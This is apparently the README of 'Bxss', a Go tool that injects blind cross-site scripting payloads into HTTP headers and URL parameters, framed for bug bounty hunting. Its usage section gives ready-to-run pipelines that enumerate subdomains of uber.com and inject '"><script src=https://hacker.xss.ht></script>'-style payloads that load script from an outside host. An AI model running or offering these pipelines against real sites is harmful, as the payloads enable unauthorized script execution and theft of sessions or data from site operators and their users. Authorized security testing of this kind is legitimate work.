![alt text](https://www.secjuice.com/content/images/2018/09/blinded-drib.jpg)
##### Version 1.0

# 😎 Bxss 😎
**A Blind XSS Injector tool**



[![Image from Gyazo](https://i.gyazo.com/61c052718748373ff2d267280e2e69cb.gif)](https://gyazo.com/61c052718748373ff2d267280e2e69cb)

### Features

- Inject Blind XSS payloads into custom headers
- Inject Blind XSS payloads into parameters
- Uses Different Request Methods (PUT,POST,GET,OPTIONS) all at once
- Tool Chaining
- Really fast
- Easy to setup


### Install


**`$ go get -u github.com/ethicalhackingplayground/bxss`**

### Arguments
```


          ____
         |  _ \
         | |_) |_  _____ ___
         |  _ <\ \/ / __/ __|
         | |_) |>  <\__ \__ \
         |____//_/\_\___/___/


        -- Coded by @z0idsec --
  -appendMode
        Append the payload to the parameter
  -concurrency int
        Set the concurrency (default 30)
  -header string
        Set the custom header (default "User-Agent")
 -headerFile string
    	Path to file containing headers to test
  -parameters
        Test the parameters for blind xss
  -payload string
        the blind XSS payload
-payloadFile string
    	Path to file containing payloads to test

        
```

[![Image from Gyazo](https://i.gyazo.com/c3f18487b015767f011d0845409c6e5b.gif)](https://gyazo.com/c3f18487b015767f011d0845409c6e5b)


### Blind XSS In Parameters
**`$ subfinder uber.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters`**

### Blind XSS In X-Forwarded-For Header

**`$ subfinder uber.com | gau | bxss -payload '"><script src=https://z0id.xss.ht></script>' -header "X-Forwarded-For"`**



**If you get a bounty please support by buying me a coffee**

<br>
<a href="https://www.buymeacoffee.com/krypt0mux" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>

